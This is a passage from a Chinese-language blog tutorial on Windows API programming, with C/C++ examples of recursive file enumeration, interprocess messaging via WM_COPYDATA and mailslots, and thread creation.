class="comment">// 4. 如果遍历到了文件，就继续，否则跳过</span></span><br><span class="line"><span class="keyword">if</span> (FindHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="comment">// 判断这个文件是不是目录</span></span><br><span class="line"><span class="keyword">if</span> (FindData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// . 当前目录  .. 上级目录 排除这两个</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(FindData.cFileName, <span class="string">&quot;.&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(FindData.cFileName, <span class="string">&quot;..&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// * 表示的是一个接受的参数，这个参数用于设置宽度</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%*s目录: %s\n&quot;</span>, level, <span class="string">&quot;&quot;</span>, FindData.cFileName);</span><br><span class="line"><span class="comment">// 拼接出目录的名字 所在目录 + 当前名字</span></span><br><span class="line">CHAR NextPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(NextPath, <span class="string">&quot;%s\\%s&quot;</span>, DirPath, FindData.cFileName);</span><br><span class="line">EnumFile(NextPath, level + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%*s文件: %s\n&quot;</span>, level, <span class="string">&quot;&quot;</span>, FindData.cFileName);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFileA(FindHandle, &amp;FindData));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭句柄，注意没有用 CloseHandle</span></span><br><span class="line">FindClose(FindHandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">EnumFile(<span class="string">&quot;D:\\&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDlg2::EnumFile</span><span class="params">(CString filePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//每次遍历都得置0</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line">dwConstSize1 = <span class="number">0</span>;</span><br><span class="line">dwConstSize2 = <span class="number">0</span>;</span><br><span class="line">CString cs;</span><br><span class="line"><span class="comment">// 拼接完整路径</span></span><br><span class="line">CString fullPath = filePath + <span class="string">L&quot;\\*&quot;</span>;</span><br><span class="line"><span class="comment">// 查找第一个文件</span></span><br><span class="line">WIN32_FIND_DATA fileData = &#123;&#125;;</span><br><span class="line">HANDLE hFile = FindFirstFile(fullPath, &amp;fileData);</span><br><span class="line"><span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 输出文件的信息，</span></span><br><span class="line"><span class="comment">// 过滤两个文件夹……</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(fileData.cFileName, <span class="string">L&quot;.&quot;</span>) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(fileData.cFileName, <span class="string">L&quot;..&quot;</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果找到的是目录，递归遍历目录中的其他文件</span></span><br><span class="line"><span class="keyword">if</span> (fileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">&#123;</span><br><span class="line">EnumFile(filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">m_FileList.InsertItem(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line"><span class="comment">// 获取文件大小</span></span><br><span class="line">DWORD dwSize = (fileData.nFileSizeHigh * (MAXDWORD + <span class="number">1</span>))</span><br><span class="line">+ fileData.nFileSizeLow;</span><br><span class="line"><span class="comment">// 转换成字符串格式</span></span><br><span class="line"></span><br><span class="line">cs.Format(<span class="string">L&quot;%d kb&quot;</span>, dwSize/<span class="number">1024</span>);</span><br><span class="line">m_FileList.SetItemText(i, <span class="number">1</span>, cs);</span><br><span class="line"><span class="comment">// 筛选处指定后缀名的文件</span></span><br><span class="line"><span class="keyword">if</span> (wcscmp(<span class="string">L&quot;.exe&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.obj&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.tlog&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.idb&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.pdb&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.pch&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.res&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.ilk&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.sdf&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.ipch&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.log&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> ||</span><br><span class="line">wcscmp(<span class="string">L&quot;.lastbuildstate&quot;</span>, PathFindExtension(fileData.cFileName)) == <span class="number">0</span> </span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">CString csPath;<span class="comment">//保存路径到vector中</span></span><br><span class="line">csPath.Format(<span class="string">L&quot;%s\\%s&quot;</span> , filePath,fileData.cFileName);</span><br><span class="line"></span><br><span class="line">path.push_back(csPath);<span class="comment">//将路径加入vector</span></span><br><span class="line">m_FileList2.InsertItem(i, filePath + <span class="string">L&quot;\\&quot;</span> + fileData.cFileName);</span><br><span class="line">m_FileList2.SetItemText(i, <span class="number">1</span>, cs);</span><br><span class="line"></span><br><span class="line">dwConstSize2 += dwSize / <span class="number">1024</span>;</span><br><span class="line">j ++;</span><br><span class="line">&#125;</span><br><span class="line">dwConstSize1 += dwSize / <span class="number">1024</span>;</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">// 继续遍历下一个文件</span></span><br><span class="line">&#125; <span class="keyword">while</span> (FindNextFile(hFile, &amp;fileData));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h3><h4 id="WM-COPYDATA"><a href="#WM-COPYDATA" class="headerlink" title="WM_COPYDATA"></a>WM_COPYDATA</h4><p>使用WM_COPYDATA进行通信</p><p>使用 WM_COPYDATA 要求接受端必须是一个窗口程序</p><h5 id="发送端"><a href="#发送端" class="headerlink" title="发送端"></a>发送端</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 查找窗口句柄</span></span><br><span class="line">HWND hWnd = FindWindowA(<span class="literal">NULL</span>, <span class="string">&quot;Window1&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置实际要传输的数据</span></span><br><span class="line">COPYDATASTRUCT Data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Data.cbData = <span class="number">6</span>;<span class="comment">// 传输的数据长度</span></span><br><span class="line">Data.lpData = (LPVOID)<span class="string">&quot;hello&quot;</span>;<span class="comment">// 传输的数据</span></span><br><span class="line">Data.dwData = <span class="number">0x12345678</span>;<span class="comment">// 通常用于表示消息的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 向指定窗口发送数据</span></span><br><span class="line">SendMessage(hWnd, WM_COPYDATA, <span class="literal">NULL</span>, (LPARAM)&amp;Data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="接收端"><a href="#接收端" class="headerlink" title="接收端"></a>接收端</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缺陷：必须是窗口程序</span></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 处理 WM_COPYDATA 消息</span></span><br><span class="line"><span class="keyword">case</span> WM_COPYDATA:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取发送过来的消息</span></span><br><span class="line">COPYDATASTRUCT* CopyData = (COPYDATASTRUCT*)lParam;</span><br><span class="line">MessageBoxA(<span class="literal">NULL</span>, (LPCSTR)CopyData-&gt;lpData, </span><br><span class="line">(LPCSTR)CopyData-&gt;lpData, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hWnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> APIENTRY <span class="title">wWinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, <span class="keyword">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 设置窗口类</span></span><br><span class="line">WNDCLASS WndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">WndClass.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">WndClass.lpfnWndProc = WndProc;</span><br><span class="line">WndClass.hInstance = hInstance;</span><br><span class="line">WndClass.lpszClassName = <span class="string">L&quot;Window&quot;</span>;</span><br><span class="line">WndClass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">WndClass.cbClsExtra = WndClass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">WndClass.hCursor = LoadCursor(<span class="literal">nullptr</span>, IDC_ARROW);</span><br><span class="line">WndClass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">WndClass.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册窗口类</span></span><br><span class="line">RegisterClass(&amp;WndClass);</span><br><span class="line"></span><br><span class="line">HWND hWnd = CreateWindowW(<span class="string">L&quot;Window&quot;</span>, <span class="string">L&quot;Window1&quot;</span>, WS_OVERLAPPEDWINDOW,</span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>, CW_USEDEFAULT, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示更新窗口</span></span><br><span class="line">ShowWindow(hWnd, nCmdShow);</span><br><span class="line">UpdateWindow(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主消息循环:</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">TranslateMessage(&amp;msg);</span><br><span class="line">DispatchMessage(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="邮槽mailslot"><a href="#邮槽mailslot" class="headerlink" title="邮槽mailslot"></a>邮槽mailslot</h4><p>使用mailslot进行通信</p><p>邮槽只能用于单向通信，但是可以在局域网内进行通信</p><h5 id="发送端-1"><a href="#发送端-1" class="headerlink" title="发送端"></a>发送端</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; 1. 打开邮槽对象</span><br><span class="line">HANDLE hFile &#x3D; CreateFile(</span><br><span class="line">L&quot;\\\\.\\mailslot\\Sample&quot;, &#x2F;&#x2F; 邮槽名称</span><br><span class="line">GENERIC_WRITE,              &#x2F;&#x2F; 读写属性</span><br><span class="line">FILE_SHARE_READ,            &#x2F;&#x2F; 共享属性</span><br><span class="line">NULL,                       &#x2F;&#x2F; 安全属性</span><br><span class="line">OPEN_EXISTING,              &#x2F;&#x2F; 打开方式</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,      &#x2F;&#x2F; 标志位</span><br><span class="line">NULL);                      &#x2F;&#x2F; 文件模板（默认留空）</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 2. 向mailslot写入</span><br><span class="line">DWORD  dwWritten &#x3D; 0;</span><br><span class="line">LPCSTR  lpMessage &#x3D; &quot;邮槽测试消息！&quot;;</span><br><span class="line">DWORD  dwMegLen &#x3D; strlen(lpMessage) + sizeof(CHAR);</span><br><span class="line">WriteFile(hFile, lpMessage, dwMegLen, &amp;dwWritten, NULL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 3. 结束</span><br><span class="line">printf(&quot;已经向邮槽写入信息！\n&quot;);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="接收端-1"><a href="#接收端-1" class="headerlink" title="接收端"></a>接收端</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 创建邮槽对象</span></span><br><span class="line">HANDLE hSlot = CreateMailslot(</span><br><span class="line"><span class="comment">// \\\\.\\mailslot\\ + 指定的名字</span></span><br><span class="line"><span class="string">L&quot;\\\\.\\mailslot\\Sample&quot;</span>,<span class="comment">// 邮槽名</span></span><br><span class="line"><span class="number">0</span>,<span class="comment">// 不限制消息大小 </span></span><br><span class="line">MAILSLOT_WAIT_FOREVER,<span class="comment">// 无超时 </span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 安全属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 循环读取邮槽信息</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.1 获取邮槽消息数量</span></span><br><span class="line">DWORD dwMsgCount = <span class="number">0</span>, dwMsgSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.2 获取邮槽信息</span></span><br><span class="line">GetMailslotInfo(</span><br><span class="line">hSlot,<span class="comment">// 邮槽句柄 </span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 无最大消息限制</span></span><br><span class="line">&amp;dwMsgSize,<span class="comment">// 下一条消息的大小</span></span><br><span class="line">&amp;dwMsgCount,<span class="comment">// 消息的数量</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 无时限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.3 当邮槽内没有消息</span></span><br><span class="line"><span class="keyword">if</span> (dwMsgSize == MAILSLOT_NO_MESSAGE) &#123;</span><br><span class="line">Sleep(<span class="number">2000</span>);<span class="comment">// 休眠2s</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.4 循环获取全部消息（有可能不只一条）</span></span><br><span class="line"><span class="keyword">while</span> (dwMsgCount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 根据目标发送的消息长度申请空间</span></span><br><span class="line">PBYTE lpBuffer = <span class="keyword">new</span> BYTE[dwMsgSize]&#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取邮槽中的信息</span></span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!ReadFile(hSlot, lpBuffer, dwMsgSize, &amp;dwRet, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ReadFile函数执行失败，错误码：%d.\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;邮槽的内容: %s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算剩余的消息数, 更新循环的条件</span></span><br><span class="line">GetMailslotInfo(hSlot, (LPDWORD)<span class="literal">NULL</span>, &amp;dwMsgSize, &amp;dwMsgCount, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">delete</span>[] lpBuffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程操作"><a href="#线程操作" class="headerlink" title="线程操作"></a>线程操作</h2><h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程内核对象，线程栈帧(局部变量、参数)，代码的起始位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程回调函数的原型</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WorkerThread</span><span class="params">(LPVOID lpThreadParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取到传入的参数</span></span><br><span class="line">LPCSTR Str = (LPCSTR)lpThreadParameter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环打印字符串</span></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WorkerThread: %s\n&quot;</span>, Str);</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建线程</span></span><br><span class="line">HANDLE Thread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 线程的安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 默认栈的大小(局部变量、参数、返回地址)</span></span><br><span class="line">WorkerThread,<span class="comment">// 线程代码的起始位置</span></span><br><span class="line">(LPVOID)<span class="string">&quot;15pb&quot;</span>,<span class="comment">// 线程函数的参数，如果传递的是地址，那么需要保证这块内存地址的生命周期（不能是局部变量）</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">// 创建标志</span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">// 传出的线程ID</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 主函数内也打印数据</span></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;MainThread\n&quot;</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// process.h</span></span><br><span class="line"><span class="comment">// _beginthreadex();  // 调用 CreateThread();</span></span><br><span class="line"><span class="comment">// _endthreadex(-1); // 调用 ExitThread(-1);</span></span><br><span class="line"></span><br><span class="line">WaitForSingleObject(Thread, INFINITY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="等待线程"><a href="#等待线程" class="headerlink" title="等待线程"></a>等待线程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 